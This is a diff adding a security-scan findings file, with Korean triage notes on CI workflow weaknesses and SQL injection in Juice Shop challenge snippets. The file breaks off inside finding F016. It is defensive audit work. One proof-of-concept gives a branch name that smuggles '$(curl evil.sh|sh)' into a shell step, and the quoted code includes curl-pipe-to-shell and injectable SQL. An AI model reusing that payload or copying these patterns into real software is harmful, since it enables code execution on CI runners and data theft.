@@ -1,0 +1,1361 @@
+[
+  {
+    "id": "F001",
+    "rule": "github-actions-mutable-action-tag",
+    "full_rule": "yaml.github-actions.security.github-actions-mutable-action-tag.github-actions-mutable-action-tag",
+    "path": ".github/workflows/ci.yml",
+    "line": 188,
+    "endline": 188,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1357: Reliance on Insufficiently Trustworthy Component",
+      "CWE-353: Missing Support for Integrity Check"
+    ],
+    "owasp": [
+      "A08:2021 - Software and Data Integrity Failures",
+      "A08:2025 - Software and Data Integrity Failures"
+    ],
+    "message": "GitHub Actions step uses a mutable tag or branch reference. Tags and branch names can be silently repointed by the action owner, enabling supply-chain attacks — as seen in the trivy-action and kics-github-action compromises. Pin the reference to a full 40-character commit SHA instead, e.g. `uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608`.",
+    "code": " 184|         uses: actions/download-artifact@fa0a91b85d4f404e444e00e005971372dc801d16 #v4.1.8\n 185|         with:\n 186|           name: api-test-lcov\n 187|       - name: \"Publish coverage to Coveralls\"\n 188|         uses: coverallsapp/github-action@v2\n 189|         with:\n 190|           github-token: ${{ secrets.GITHUB_TOKEN }}\n 191|           files: frontend-lcov.info server-lcov.info api-lcov.info\n 192|   custom-config-test:",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.9,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-hardening",
+      "rationale": "CI 스텝이 변경 가능한 태그(coverallsapp/github-action@v2)를 사용 — 태그가 조용히 다른 커밋으로 바뀔 수 있음.",
+      "evidence": "uses: coverallsapp/github-action@v2",
+      "suggested_fix": "40자리 커밋 SHA로 고정.",
+      "triage_note": "실제 공급망 위생 이슈지만 우선순위 낮음. 변경가능 태그 7건 중 1건 — 중복 처리.",
+      "poc": "공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음."
+    }
+  },
+  {
+    "id": "F002",
+    "rule": "gha-curl-pipe-shell",
+    "full_rule": "yaml.github-actions.security.gha-curl-pipe-shell.gha-curl-pipe-shell",
+    "path": ".github/workflows/ci.yml",
+    "line": 359,
+    "endline": 359,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    ],
+    "owasp": [
+      "A03:2021 - Injection",
+      "A03:2025 - Injection"
+    ],
+    "message": "A `run:` step pipes the output of `curl` or `wget` directly into a shell interpreter. This is the \"curl | bash\" install pattern — if the remote server is compromised or the URL is hijacked, an attacker can execute arbitrary code in your CI runner. Consider downloading the file first, verifying its checksum or signature, and then executing it.",
+    "code": " 355|     steps:\n 356|       - name: \"Check out Git repository\"\n 357|         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 #v7.0.1\n 358|       - name: \"Install Heroku CLI\"\n 359|         run: curl https://cli-assets.heroku.com/install.sh | sh\n 360|       - name: \"Set Heroku app & branch for ${{ github.ref }}\"\n 361|         run: |\n 362|           if [ \"$GITHUB_REF\" == \"refs/heads/master\" ]; then\n 363|           echo \"HEROKU_APP=juice-shop\" >> $GITHUB_ENV",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.85,
+      "exploitability": "MEDIUM",
+      "reachable": "true",
+      "priority": "P3",
+      "category": "supply-chain",
+      "rationale": "Heroku CLI 설치를 curl로 받아 바로 sh에 파이프 — 원격 서버 침해 시 CI 러너에서 RCE.",
+      "evidence": "run: curl https://cli-assets.heroku.com/install.sh | sh",
+      "suggested_fix": "파일을 먼저 받고 체크섬/서명 검증 후 실행.",
+      "triage_note": "신뢰 벤더 도메인이라 위험은 낮아지나 완전히 제거되진 않음.",
+      "poc": "공급망: cli-assets.heroku.com 이 탈취되면 공격자 install.sh 를 서빙 → CI 러너에서 임의 코드 실행. 클라이언트 페이로드는 없음."
+    }
+  },
+  {
+    "id": "F003",
+    "rule": "github-actions-mutable-action-tag",
+    "full_rule": "yaml.github-actions.security.github-actions-mutable-action-tag.github-actions-mutable-action-tag",
+    "path": ".github/workflows/codeql-analysis.yml",
+    "line": 23,
+    "endline": 23,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1357: Reliance on Insufficiently Trustworthy Component",
+      "CWE-353: Missing Support for Integrity Check"
+    ],
+    "owasp": [
+      "A08:2021 - Software and Data Integrity Failures",
+      "A08:2025 - Software and Data Integrity Failures"
+    ],
+    "message": "GitHub Actions step uses a mutable tag or branch reference. Tags and branch names can be silently repointed by the action owner, enabling supply-chain attacks — as seen in the trivy-action and kics-github-action compromises. Pin the reference to a full 40-character commit SHA instead, e.g. `uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608`.",
+    "code": "  19|     steps:\n  20|     - name: Checkout repository\n  21|       uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 #v7.0.1\n  22|     - name: Initialize CodeQL\n  23|       uses: github/codeql-action/init@v3\n  24|       with:\n  25|         languages: ${{ matrix.language }}\n  26|         queries: security-extended\n  27|         config: |",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.9,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-hardening",
+      "rationale": "codeql-action/init 이 변경가능 @v3 에 고정.",
+      "evidence": "uses: github/codeql-action/init@v3",
+      "suggested_fix": "커밋 SHA로 고정.",
+      "triage_note": "변경가능 태그 군집.",
+      "poc": "공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음."
+    }
+  },
+  {
+    "id": "F004",
+    "rule": "github-actions-mutable-action-tag",
+    "full_rule": "yaml.github-actions.security.github-actions-mutable-action-tag.github-actions-mutable-action-tag",
+    "path": ".github/workflows/codeql-analysis.yml",
+    "line": 34,
+    "endline": 34,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1357: Reliance on Insufficiently Trustworthy Component",
+      "CWE-353: Missing Support for Integrity Check"
+    ],
+    "owasp": [
+      "A08:2021 - Software and Data Integrity Failures",
+      "A08:2025 - Software and Data Integrity Failures"
+    ],
+    "message": "GitHub Actions step uses a mutable tag or branch reference. Tags and branch names can be silently repointed by the action owner, enabling supply-chain attacks — as seen in the trivy-action and kics-github-action compromises. Pin the reference to a full 40-character commit SHA instead, e.g. `uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608`.",
+    "code": "  30|           query-filters:\n  31|           - exclude:\n  32|                id: js/missing-rate-limiting\n  33|     - name: Autobuild\n  34|       uses: github/codeql-action/autobuild@v3\n  35|     - name: Perform CodeQL Analysis\n  36|       uses: github/codeql-action/analyze@v3",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.9,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-hardening",
+      "rationale": "codeql-action/autobuild 이 변경가능 @v3 에 고정.",
+      "evidence": "uses: github/codeql-action/autobuild@v3",
+      "suggested_fix": "커밋 SHA로 고정.",
+      "triage_note": "변경가능 태그 군집.",
+      "poc": "공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음."
+    }
+  },
+  {
+    "id": "F005",
+    "rule": "github-actions-mutable-action-tag",
+    "full_rule": "yaml.github-actions.security.github-actions-mutable-action-tag.github-actions-mutable-action-tag",
+    "path": ".github/workflows/codeql-analysis.yml",
+    "line": 36,
+    "endline": 36,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1357: Reliance on Insufficiently Trustworthy Component",
+      "CWE-353: Missing Support for Integrity Check"
+    ],
+    "owasp": [
+      "A08:2021 - Software and Data Integrity Failures",
+      "A08:2025 - Software and Data Integrity Failures"
+    ],
+    "message": "GitHub Actions step uses a mutable tag or branch reference. Tags and branch names can be silently repointed by the action owner, enabling supply-chain attacks — as seen in the trivy-action and kics-github-action compromises. Pin the reference to a full 40-character commit SHA instead, e.g. `uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608`.",
+    "code": "  32|                id: js/missing-rate-limiting\n  33|     - name: Autobuild\n  34|       uses: github/codeql-action/autobuild@v3\n  35|     - name: Perform CodeQL Analysis\n  36|       uses: github/codeql-action/analyze@v3",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.9,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-hardening",
+      "rationale": "codeql-action/analyze 가 변경가능 @v3 에 고정.",
+      "evidence": "uses: github/codeql-action/analyze@v3",
+      "suggested_fix": "커밋 SHA로 고정.",
+      "triage_note": "변경가능 태그 군집.",
+      "poc": "공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음."
+    }
+  },
+  {
+    "id": "F006",
+    "rule": "github-actions-mutable-action-tag",
+    "full_rule": "yaml.github-actions.security.github-actions-mutable-action-tag.github-actions-mutable-action-tag",
+    "path": ".github/workflows/image_actions.yml",
+    "line": 30,
+    "endline": 30,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1357: Reliance on Insufficiently Trustworthy Component",
+      "CWE-353: Missing Support for Integrity Check"
+    ],
+    "owasp": [
+      "A08:2021 - Software and Data Integrity Failures",
+      "A08:2025 - Software and Data Integrity Failures"
+    ],
+    "message": "GitHub Actions step uses a mutable tag or branch reference. Tags and branch names can be silently repointed by the action owner, enabling supply-chain attacks — as seen in the trivy-action and kics-github-action compromises. Pin the reference to a full 40-character commit SHA instead, e.g. `uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608`.",
+    "code": "  26|       (github.event_name != 'pull_request' ||\n  27|        github.event.pull_request.head.repo.full_name == github.repository)\n  28|     steps:\n  29|       - name: Checkout Branch\n  30|         uses: actions/checkout@v6\n  31|       - name: Compress Images\n  32|         id: calibre\n  33|         uses: calibreapp/image-actions@main\n  34|         with:",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.9,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-hardening",
+      "rationale": "actions/checkout 이 변경가능 메이저 @v6 에 고정.",
+      "evidence": "uses: actions/checkout@v6",
+      "suggested_fix": "커밋 SHA로 고정.",
+      "triage_note": "변경가능 태그 군집.",
+      "poc": "공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음."
+    }
+  },
+  {
+    "id": "F007",
+    "rule": "github-actions-mutable-action-tag",
+    "full_rule": "yaml.github-actions.security.github-actions-mutable-action-tag.github-actions-mutable-action-tag",
+    "path": ".github/workflows/image_actions.yml",
+    "line": 33,
+    "endline": 33,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1357: Reliance on Insufficiently Trustworthy Component",
+      "CWE-353: Missing Support for Integrity Check"
+    ],
+    "owasp": [
+      "A08:2021 - Software and Data Integrity Failures",
+      "A08:2025 - Software and Data Integrity Failures"
+    ],
+    "message": "GitHub Actions step uses a mutable tag or branch reference. Tags and branch names can be silently repointed by the action owner, enabling supply-chain attacks — as seen in the trivy-action and kics-github-action compromises. Pin the reference to a full 40-character commit SHA instead, e.g. `uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608`.",
+    "code": "  29|       - name: Checkout Branch\n  30|         uses: actions/checkout@v6\n  31|       - name: Compress Images\n  32|         id: calibre\n  33|         uses: calibreapp/image-actions@main\n  34|         with:\n  35|           githubToken: ${{ secrets.GITHUB_TOKEN }}\n  36|           ignorePaths: '**/3d_keychain.jpg,**/favorite-hiking-place.png,**/5.png'\n  37|           compressOnly: ${{ github.event_name != 'pull_request' }}",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.92,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P3",
+      "category": "ci-hardening",
+      "rationale": "calibreapp/image-actions 가 @main(움직이는 브랜치)에 고정 — 가장 약한 참조.",
+      "evidence": "uses: calibreapp/image-actions@main",
+      "suggested_fix": "커밋 SHA로 고정.",
+      "triage_note": "@main 은 버전 태그보다 위험 — 군집 내에서 우선순위 약간 상향.",
+      "poc": "공급망: @main 은 움직이는 브랜치 — 액션 소유자(또는 리포지토리 침해)가 언제든 CI 에서 임의 코드 실행 가능."
+    }
+  },
+  {
+    "id": "F008",
+    "rule": "github-actions-mutable-action-tag",
+    "full_rule": "yaml.github-actions.security.github-actions-mutable-action-tag.github-actions-mutable-action-tag",
+    "path": ".github/workflows/image_actions.yml",
+    "line": 42,
+    "endline": 42,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1357: Reliance on Insufficiently Trustworthy Component",
+      "CWE-353: Missing Support for Integrity Check"
+    ],
+    "owasp": [
+      "A08:2021 - Software and Data Integrity Failures",
+      "A08:2025 - Software and Data Integrity Failures"
+    ],
+    "message": "GitHub Actions step uses a mutable tag or branch reference. Tags and branch names can be silently repointed by the action owner, enabling supply-chain attacks — as seen in the trivy-action and kics-github-action compromises. Pin the reference to a full 40-character commit SHA instead, e.g. `uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608`.",
+    "code": "  38|       - name: Create Pull Request\n  39|         if: |\n  40|           github.event_name != 'pull_request' &&\n  41|           steps.calibre.outputs.markdown != ''\n  42|         uses: peter-evans/create-pull-request@v8\n  43|         with:\n  44|           title: Auto Compress Images\n  45|           delete-branch: true\n  46|           commit-message: Compress Images",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.9,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-hardening",
+      "rationale": "peter-evans/create-pull-request 가 변경가능 @v8 에 고정.",
+      "evidence": "uses: peter-evans/create-pull-request@v8",
+      "suggested_fix": "커밋 SHA로 고정.",
+      "triage_note": "변경가능 태그 군집.",
+      "poc": "공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음."
+    }
+  },
+  {
+    "id": "F009",
+    "rule": "run-shell-injection",
+    "full_rule": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+    "path": ".github/workflows/update-challenges-ebook.yml",
+    "line": 22,
+    "endline": 25,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Using variable interpolation `${{...}}` with `github` context data in a `run:` step could allow an attacker to inject their own code into the runner. This would allow them to steal secrets and code. `github` context data can have arbitrary user input and should be treated as untrusted. Instead, use an intermediate environment variable with `env:` to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".",
+    "code": "  18|         token: ${{ secrets.BOT_TOKEN }}\n  19|         repository: juice-shop/pwning-juice-shop\n  20|         ref: ${{ github.ref_name }}\n  21|     - name: Update challenges.yml\n  22|       run: |\n  23|         cd docs/modules/ROOT/assets/data\n  24|         rm challenges.yml\n  25|         wget https://raw.githubusercontent.com/juice-shop/juice-shop/${{ github.ref_name }}/data/static/challenges.yml\n  26|     - uses: stefanzweifel/git-auto-commit-action@8621497c8c39c72f3e2a999a26b4ca1b5058a842 #v5.0.1\n  27|       with:\n  28|         commit_message: \"Auto-update challenges.yml from ${{ github.sha }}\"\n  29|         branch: ${{ github.ref_name }}",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.7,
+      "exploitability": "MEDIUM",
+      "reachable": "true",
+      "priority": "P3",
+      "category": "ci-injection",
+      "rationale": "github.ref_name 이 run: 안 wget URL에 삽입 — 셸 스텝에 신뢰불가 컨텍스트가 들어감.",
+      "evidence": "wget https://.../${{ github.ref_name }}/data/static/challenges.yml",
+      "suggested_fix": "ref_name 을 env: 변수로 옮기고 따옴표 처리.",
+      "triage_note": "ref_name에 대한 공격자 영향은 제한적이나 주입 패턴 자체는 유효.",
+      "poc": "브랜치/태그 이름을 예: $(curl evil.sh|sh) 로 만들면 run: wget URL 에 삽입됨. 리포지토리 push/tag 권한 필요."
+    }
+  },
+  {
+    "id": "F010",
+    "rule": "run-shell-injection",
+    "full_rule": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+    "path": ".github/workflows/update-challenges-www-legacy.yml",
+    "line": 27,
+    "endline": 34,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Using variable interpolation `${{...}}` with `github` context data in a `run:` step could allow an attacker to inject their own code into the runner. This would allow them to steal secrets and code. `github` context data can have arbitrary user input and should be treated as untrusted. Instead, use an intermediate environment variable with `env:` to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".",
+    "code": "  23|       uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 #v7.0.1\n  24|       with:\n  25|         path: juice-shop\n  26|     - name: Update challenges.yml\n  27|       run: |\n  28|         if [ \"${{ github.ref_name }}\" = \"master\" ]; then\n  29|           DEST_FILE=\"_data/challenges.yml\"\n  30|         else\n  31|           DEST_FILE=\"_data/challenges_dev.yml\"\n  32|         fi\n  33|         rm -f $DEST_FILE\n  34|         cp juice-shop/data/static/challenges.yml $DEST_FILE\n  35|     - name: Update snippets\n  36|       run: |\n  37|         if [ \"${{ github.ref_name }}\" = \"master\" ]; then\n  38|           DEST_FILE=\"_data/snippets.json\"",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-injection",
+      "rationale": "ref_name 이 따옴표로 감싼 문자열 비교에 사용 — 따옴표 처리로 주입 가능성 제한.",
+      "evidence": "if [ \"${{ github.ref_name }}\" = \"master\" ]",
+      "suggested_fix": "env: 변수 우회 사용.",
+      "triage_note": "따옴표 비교라 F009 대비 악용가능성 크게 낮음.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F011",
+    "rule": "run-shell-injection",
+    "full_rule": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+    "path": ".github/workflows/update-challenges-www-legacy.yml",
+    "line": 36,
+    "endline": 44,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Using variable interpolation `${{...}}` with `github` context data in a `run:` step could allow an attacker to inject their own code into the runner. This would allow them to steal secrets and code. `github` context data can have arbitrary user input and should be treated as untrusted. Instead, use an intermediate environment variable with `env:` to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".",
+    "code": "  32|         fi\n  33|         rm -f $DEST_FILE\n  34|         cp juice-shop/data/static/challenges.yml $DEST_FILE\n  35|     - name: Update snippets\n  36|       run: |\n  37|         if [ \"${{ github.ref_name }}\" = \"master\" ]; then\n  38|           DEST_FILE=\"_data/snippets.json\"\n  39|         else\n  40|           DEST_FILE=\"_data/snippets_dev.json\"\n  41|         fi\n  42|         rm -f $DEST_FILE\n  43|         CHALLENGES=$(ls juice-shop/data/static/codefixes/*.info.yml | xargs -n 1 basename | sed 's/\\.info\\.yml//' | jq -R . | jq -s -c '{\"challenges\": .}')\n  44|         echo $CHALLENGES > $DEST_FILE\n  45|     - uses: stefanzweifel/git-auto-commit-action@8621497c8c39c72f3e2a999a26b4ca1b5058a842 #v5.0.1\n  46|       with:\n  47|         file_pattern: '_data/challenges.yml _data/snippets.json _data/challenges_dev.yml _data/snippets_dev.json'\n  48|         commit_message: \"🤖 Auto-update challenges and snippets for ${{ github.ref_name }} from ${{ github.sha }}\"",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-injection",
+      "rationale": "F010과 동일한 따옴표 ref_name 비교 패턴.",
+      "evidence": "if [ \"${{ github.ref_name }}\" = \"master\" ]",
+      "suggested_fix": "env: 변수 우회 사용.",
+      "triage_note": "따옴표 처리 — 악용가능성 낮음.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F012",
+    "rule": "run-shell-injection",
+    "full_rule": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+    "path": ".github/workflows/update-challenges-www.yml",
+    "line": 27,
+    "endline": 34,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Using variable interpolation `${{...}}` with `github` context data in a `run:` step could allow an attacker to inject their own code into the runner. This would allow them to steal secrets and code. `github` context data can have arbitrary user input and should be treated as untrusted. Instead, use an intermediate environment variable with `env:` to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".",
+    "code": "  23|       uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 #v7.0.1\n  24|       with:\n  25|         path: juice-shop\n  26|     - name: Update challenges.yml\n  27|       run: |\n  28|         if [ \"${{ github.ref_name }}\" = \"master\" ]; then\n  29|           DEST_FILE=\"_data/challenges.yml\"\n  30|         else\n  31|           DEST_FILE=\"_data/challenges_dev.yml\"\n  32|         fi\n  33|         rm -f $DEST_FILE\n  34|         cp juice-shop/data/static/challenges.yml $DEST_FILE\n  35|     - name: Update snippets\n  36|       run: |\n  37|         if [ \"${{ github.ref_name }}\" = \"master\" ]; then\n  38|           DEST_FILE=\"_data/snippets.json\"",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-injection",
+      "rationale": "동일한 따옴표 ref_name 비교 패턴.",
+      "evidence": "if [ \"${{ github.ref_name }}\" = \"master\" ]",
+      "suggested_fix": "env: 변수 우회 사용.",
+      "triage_note": "따옴표 처리 — 악용가능성 낮음.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F013",
+    "rule": "run-shell-injection",
+    "full_rule": "yaml.github-actions.security.run-shell-injection.run-shell-injection",
+    "path": ".github/workflows/update-challenges-www.yml",
+    "line": 36,
+    "endline": 44,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Using variable interpolation `${{...}}` with `github` context data in a `run:` step could allow an attacker to inject their own code into the runner. This would allow them to steal secrets and code. `github` context data can have arbitrary user input and should be treated as untrusted. Instead, use an intermediate environment variable with `env:` to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".",
+    "code": "  32|         fi\n  33|         rm -f $DEST_FILE\n  34|         cp juice-shop/data/static/challenges.yml $DEST_FILE\n  35|     - name: Update snippets\n  36|       run: |\n  37|         if [ \"${{ github.ref_name }}\" = \"master\" ]; then\n  38|           DEST_FILE=\"_data/snippets.json\"\n  39|         else\n  40|           DEST_FILE=\"_data/snippets_dev.json\"\n  41|         fi\n  42|         rm -f $DEST_FILE\n  43|         CHALLENGES=$(ls juice-shop/data/static/codefixes/*.info.yml | xargs -n 1 basename | sed 's/\\.info\\.yml//' | jq -R . | jq -s -c '{\"challenges\": .}')\n  44|         echo $CHALLENGES > $DEST_FILE\n  45|     - uses: stefanzweifel/git-auto-commit-action@8621497c8c39c72f3e2a999a26b4ca1b5058a842 #v5.0.1\n  46|       with:\n  47|         file_pattern: '_data/challenges.yml _data/snippets.json _data/challenges_dev.yml _data/snippets_dev.json'\n  48|         commit_message: \"🤖 Auto-update challenges and snippets for ${{ github.ref_name }} from ${{ github.sha }}\"",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "ci-injection",
+      "rationale": "동일한 따옴표 ref_name 비교 패턴.",
+      "evidence": "if [ \"${{ github.ref_name }}\" = \"master\" ]",
+      "suggested_fix": "env: 변수 우회 사용.",
+      "triage_note": "따옴표 처리 — 악용가능성 낮음.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F014",
+    "rule": "npm-missing-minimum-release-age",
+    "full_rule": "package_managers.npm.npm-missing-minimum-release-age.npm-missing-minimum-release-age",
+    "path": ".npmrc",
+    "line": 1,
+    "endline": 1,
+    "severity": "MEDIUM",
+    "cwe": [
+      "CWE-829: Inclusion of Functionality from Untrusted Control Sphere"
+    ],
+    "owasp": [
+      "A08:2021 - Software and Data Integrity Failures"
+    ],
+    "message": "This .npmrc does not set a minimum release age or sets it too low. Newly published packages can be malicious or unstable. Add `min-release-age = 7` to wait 7 days before resolving newly published package versions. Added in: v11.10 Reference: https://github.blog/changelog/2026-02-18-npm-bulk-trusted-publishing-config-and-script-security-now-generally-available/",
+    "code": "   1| package-lock=false",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.5,
+      "exploitability": "LOW",
+      "reachable": "unknown",
+      "priority": "P4",
+      "category": "supply-chain",
+      "rationale": "의견성 신규 룰: .npmrc 에 min-release-age 미설정. 취약점이 아니라 하드닝 기본값.",
+      "evidence": "package-lock=false (min-release-age 없음)",
+      "suggested_fix": "원하면 min-release-age = 7 추가.",
+      "triage_note": "정보성. 매우 최신 룰(npm v11.10). 결함이 아니라 팀 정책 판단 사항.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F015",
+    "rule": "express-sequelize-injection",
+    "full_rule": "javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+    "path": "data/static/codefixes/dbSchemaChallenge_1.ts",
+    "line": 5,
+    "endline": 5,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Detected a sequelize statement that is tainted by user-input. This could lead to SQL injection if the variable is user-controlled and is not properly sanitized. In order to prevent SQL injection, it is recommended to use parameterized queries or prepared statements.",
+    "code": "   1| export function searchProducts () {\n   2|   return (req: Request, res: Response, next: NextFunction) => {\n   3|     let criteria: any = req.query.q === 'undefined' ? '' : req.query.q ?? ''\n   4|     criteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)\n   5|     models.sequelize.query(\"SELECT * FROM Products WHERE ((name LIKE '%\"+criteria+\"%' OR description LIKE '%\"+criteria+\"%') AND deletedAt IS NULL) ORDER BY name\")\n   6|       .then(([products]: any) => {\n   7|         const dataString = JSON.stringify(products)\n   8|         for (let i = 0; i < products.length; i++) {\n   9|           products[i].name = req.__(products[i].name)",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.85,
+      "exploitability": "LOW",
+      "reachable": "false",
+      "priority": "P3",
+      "category": "sql-injection",
+      "rationale": "사용자 criteria 를 문자열 접합으로 Sequelize 원시 쿼리에 삽입, 파라미터화 없음 — 실제 SQLi 패턴.",
+      "evidence": "sequelize.query(\"... LIKE '%\"+criteria+\"%' ...\")",
+      "suggested_fix": "파라미터화 replacements / 바인드 파라미터 사용.",
+      "triage_note": "파일이 data/static/codefixes/ — 챌린지용 코드픽스 스니펫이며 마운트된 라우트가 아님. 실제 대응물은 F035.",
+      "poc": "F035 와 동일한 SQLi 유형이나, 이 파일은 코드픽스 훈련 스니펫 — 마운트된 라우트가 아니므로 공격할 라이브 엔드포인트가 없음."
+    }
+  },
+  {
+    "id": "F016",
+    "rule": "express-sequelize-injection",
+    "full_rule": "javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+    "path": "data/static/codefixes/dbSchemaChallenge_3.ts",
+    "line": 11,
+    "endline": 11,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Detected a sequelize statement that is tainted by user-input. This could lead to SQL injection if the variable is user-controlled and is not properly sanitized. In order to prevent SQL injection, it is recommended to use parameterized queries or prepared statements.",
+    "code": "   7|     if (criteria.match(injectionChars)) {\n   8|       res.status(400).send()\n   9|       return\n  10|     }\n  11|     models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)\n  12|       .then(([products]: any) => {\n  13|         const dataString = JSON.stringify(products)\n  14|         for (let i = 0; i < products.length; i++) {\n  15|           products[i].name = req.__(products[i].name)",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.55,
+      "exploitability": "LOW",
+      "reachable": "false",
+      "priority": "P4",
+      "category": "sql-injection",
+      "rationale": "템플릿 리터럴 쿼리지만 앞에서 injectionChars 필터로 입력을 거부함.",
+      "evidence": "if (criteria.match(injectionChars)) { res.status(400) }",
+      "suggested_fix": "블록리스트 필터보다 파라미터화 권장.",
